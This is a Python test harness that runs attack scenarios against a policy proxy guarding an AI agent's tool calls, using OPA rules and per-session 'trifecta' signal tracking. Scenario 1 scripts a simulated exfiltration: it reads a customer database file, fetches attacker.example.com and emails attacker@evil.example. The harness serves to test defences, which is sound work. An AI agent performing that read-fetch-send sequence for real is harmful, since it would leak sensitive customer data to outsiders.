#!/usr/bin/env python3
"""
Phase 6: attack scenario evaluation harness. Runs all 6 named scenarios
against the live proxy, plus a formalized OPA-unreachable fail-closed
check, a latency check, and a concurrency stress test on session_state's
thread safety.

Assumes tool servers + OPA (guardrail_phase4.rego) + proxy are already
running (use run_phase6.sh). Runs against the local mocks, not real AWS --
Phase 5 already proved the AWS path live; this suite is about the
decision logic and needs to run repeatably, for free, on demand.
"""
import concurrent.futures
import json
import statistics
import sys
import time
import urllib.request
import uuid

PROXY = "http://localhost:8000"
LATENCY_TARGET_MS = 500  # generous: Flask -> OPA over HTTP -> Flask, all on localhost

sys.path.insert(0, "proxy")

results = []


def http_json(url, method="GET", body=None, timeout=10):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                  headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def call(tool, arguments, role="research_agent", session_id=None):
    return http_json(f"{PROXY}/call", method="POST", body={
        "tool": tool, "arguments": arguments, "role": role,
        "session_id": session_id or str(uuid.uuid4()),
    })


def check(name, condition, detail=""):
    results.append((name, condition))
    print(f"  {'PASS' if condition else 'FAIL'}: {name}" + (f" ({detail})" if detail else ""))


# ---------------------------------------------------------------------------
# Scenario 1: Exfiltration. Read sensitive data, ingest untrusted content,
# then attempt to exfiltrate via a role that would normally be allowed to
# send email. The trifecta override must block the exfiltration attempt
# itself -- role-based policy alone would have said yes.
# ---------------------------------------------------------------------------
def scenario_exfiltration():
    print("Scenario 1: exfiltration attempt")
    sid = f"exfil-{uuid.uuid4()}"
    call("fs_read", {"path": "customers.db.txt"}, session_id=sid)              # touched_sensitive
    call("fetch_url", {"url": "http://attacker.example.com"}, session_id=sid)  # + ingested_untrusted -> partial
    status, body = call("send_email", {"to": "attacker@evil.example", "subject": "data", "body": "..."},
                         role="trusted_agent", session_id=sid)
    check("exfiltration attempt blocked despite trusted_agent role normally allowing send_email",
          status in (403, 202) and body.get("decision") in ("deny", "require_approval"),
          f"got {body.get('decision')}")


# ---------------------------------------------------------------------------
# Scenario 2: Malicious write. Writing to a sensitive resource must be held
# for approval, never silently executed, regardless of trifecta state.
# ---------------------------------------------------------------------------
def scenario_malicious_write():
    print("Scenario 2: malicious write to sensitive resource")
    sid = f"malwrite-{uuid.uuid4()}"
    status, body = call("fs_write", {"path": "customers.important", "content": "corrupted"}, session_id=sid)
    check("write to customers.* held for approval, not executed",
          status == 202 and body.get("decision") == "require_approval", f"got {body}")


# ---------------------------------------------------------------------------
# Scenario 3: False-positive control. An entirely benign, ordinary session
# must never get blocked anywhere. The guardrail should be silent when
# nothing is actually wrong -- this is the scenario that proves it isn't
# just paranoid by default.
# ---------------------------------------------------------------------------
def scenario_false_positive_control():
    print("Scenario 3: false-positive control (benign session)")
    sid = f"benign-{uuid.uuid4()}"
    steps = [
        ("db_query_nonpii", {"query": "select * from sales"}),
        ("fs_read", {"path": "reports/quarterly.txt"}),
        ("fs_read", {"path": "reports/quarterly.txt"}),
    ]
    all_allowed = True
    for tool, args in steps:
        status, body = call(tool, args, session_id=sid)
        if not (status == 200 and body.get("decision") == "allow"):
            all_allowed = False
    check("entirely benign session never gets blocked", all_allowed)


# ---------------------------------------------------------------------------
# Scenario 4: Sensitive-only. Touching sensitive data ALONE -- no untrusted
# content, no external reach -- must stay trifecta_state "none". This is
# the design's own stated intent: any one signal alone is normal, safe
# agent behavior, not something to react to.
# ---------------------------------------------------------------------------
def scenario_sensitive_only():
    print("Scenario 4: sensitive-only (one signal must not trip anything)")
    sid = f"sensonly-{uuid.uuid4()}"
    call("fs_read", {"path": "customers.db.txt"}, session_id=sid)
    status, body = call("fs_read", {"path": "reports/quarterly.txt"}, session_id=sid)
    check("second read still allowed, trifecta still 'none' after one signal type",
          status == 200 and body.get("decision") == "allow" and body.get("trifecta_state") == "none",
          f"got {body}")


# ---------------------------------------------------------------------------
# Scenario 5: Session isolation. One session's fully-tripped state must
# never leak into a different session_id.
# ---------------------------------------------------------------------------
def scenario_session_isolation():
    print("Scenario 5: session isolation")
    tripped_sid = f"tripped-{uuid.uuid4()}"
    call("fs_read", {"path": "customers.db.txt"}, session_id=tripped_sid)
    call("fetch_url", {"url": "http://example.com"}, session_id=tripped_sid)
    call("send_email", {"to": "x@example.com", "subject": "x", "body": "x"},
         role="trusted_agent", session_id=tripped_sid)
    fresh_sid = f"fresh-{uuid.uuid4()}"
    status, body = call("fs_read", {"path": "reports/quarterly.txt"}, session_id=fresh_sid)
    check("a fresh session is unaffected by another session's tripped state",
          status == 200 and body.get("decision") == "allow", f"got {body}")


# ---------------------------------------------------------------------------
# Scenario 6: Concurrency. Many calls to the SAME session, fired at once,
# must not corrupt session_state's signal tracking under session_state.py's
# lock, and must not crash the proxy.
# ---------------------------------------------------------------------------
def scenario_concurrency():
    print("Scenario 6: concurrency (20 concurrent calls, one session)")
    sid = f"concurrent-{uuid.uuid4()}"

    def one_call(_):
        return call("fs_read", {"path": "customers.db.txt"}, session_id=sid)

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        outcomes = list(pool.map(one_call, range(20)))

    no_crashes = all(status in (200, 403, 202) for status, _ in outcomes)
    all_allowed = all(status == 200 and body.get("decision") == "allow" for status, body in outcomes)
    check("20 concurrent calls all completed with no crash (no 500s)", no_crashes)
    check("all 20 concurrent calls correctly allowed (same signal type, repeatedly)", all_allowed)

    status, body = call("fs_read", {"path": "customers.db.txt"}, session_id=sid)
    check("session_state stayed consistent under concurrent access (still 'none', not corrupted)",
          body.get("trifecta_state") == "none", f"got {body.get('trifecta_state')}")


# ---------------------------------------------------------------------------
# Fail-closed: OPA unreachable -> deny. Proven ad hoc back in Phase 3;
# formalized here as a permanent regression check. Tests opa_client.py
# directly (the exact code path the live proxy uses) rather than
# disrupting the shared OPA server the other scenarios depend on.
# ---------------------------------------------------------------------------
def scenario_fail_closed_opa_unreachable():
    print("Fail-closed: OPA unreachable")
    import opa_client
    original_url = opa_client.OPA_URL
    opa_client.OPA_URL = "http://localhost:1"  # nothing listens here
    try:
        decision = opa_client.decide("research_agent", "fs_read", "reports/quarterly.txt", "none")
    finally:
        opa_client.OPA_URL = original_url
    check("OPA unreachable -> deny (not a crash, not a silent allow)",
          decision == "deny", f"got {decision!r}")


# ---------------------------------------------------------------------------
# Latency: a plain decision round-trip should complete quickly.
# ---------------------------------------------------------------------------
def scenario_latency():
    print("Latency check")
    timings = []
    for _ in range(20):
        start = time.time()
        call("fs_read", {"path": "reports/quarterly.txt"})
        timings.append((time.time() - start) * 1000)
    p50 = statistics.median(timings)
    p95 = sorted(timings)[int(len(timings) * 0.95) - 1]
    check(f"p50 latency under {LATENCY_TARGET_MS}ms", p50 < LATENCY_TARGET_MS,
          f"p50={p50:.1f}ms, p95={p95:.1f}ms")


if __name__ == "__main__":
    scenario_exfiltration()
    scenario_malicious_write()
    scenario_false_positive_control()
    scenario_sensitive_only()
    scenario_session_isolation()
    scenario_concurrency()
    scenario_fail_closed_opa_unreachable()
    scenario_latency()

    print()
    passed = sum(1 for _, ok in results if ok)
    print(f"{passed}/{len(results)} checks passed")
    sys.exit(0 if passed == len(results) else 1)
